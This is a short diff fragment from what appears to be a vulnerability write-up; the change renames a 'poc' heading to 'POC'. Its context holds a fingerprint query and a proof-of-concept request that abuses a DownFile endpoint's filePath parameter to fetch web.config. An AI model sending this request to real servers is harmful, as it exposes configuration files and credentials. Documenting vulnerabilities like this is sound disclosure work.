@@ -8,7 +8,7 @@
 body="/api/SingleLogin"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /PublicInfoManage/Upload/DownFile?filePath=web.config HTTP/1.0
